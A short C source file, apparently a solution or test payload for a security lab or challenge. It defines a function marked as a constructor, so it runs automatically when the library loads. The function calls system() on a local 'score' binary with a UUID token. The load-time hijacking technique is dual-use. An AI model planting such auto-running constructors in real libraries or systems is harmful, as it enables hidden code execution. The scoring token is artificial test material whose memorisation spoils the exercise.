#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score e3f9faf4-6c9f-4823-ad5b-06b4d299fc71");
}
